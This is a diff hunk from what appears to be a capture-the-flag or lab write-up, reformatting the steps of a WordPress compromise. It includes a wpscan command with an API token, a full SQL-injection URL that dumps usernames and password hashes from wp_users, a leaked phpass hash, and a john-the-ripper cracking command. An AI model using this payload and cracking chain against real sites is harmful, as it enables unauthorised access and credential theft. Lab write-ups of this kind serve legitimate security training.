@@ -905,8 +905,7 @@
        - `wpscan --url http://alvida-eatery.org --api-token Cnwa5qbii36TyV5oHvnXnQObqC1CQAkJdPsaf5T8i0c`
        - **Output: WordPress 6.0, wp-login.php found, [vulnerable plugin - Unauthenticated SQL Injection](https://wpscan.com/vulnerability/c1620905-7c31-4e62-80f5-1d9635be11ad (Unauthenticated SQL Injection))**  
     4. login portal disclose user 'admin'
-    5. PoC `http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users
-password leak: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0`
+    5. PoC `http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users  
     6. Password leak: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0 (WordPress hash password~hahs.txt)
     7. `john --format=phpass hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`: 'hulabaloo'
     8. Login to wordpress portal   
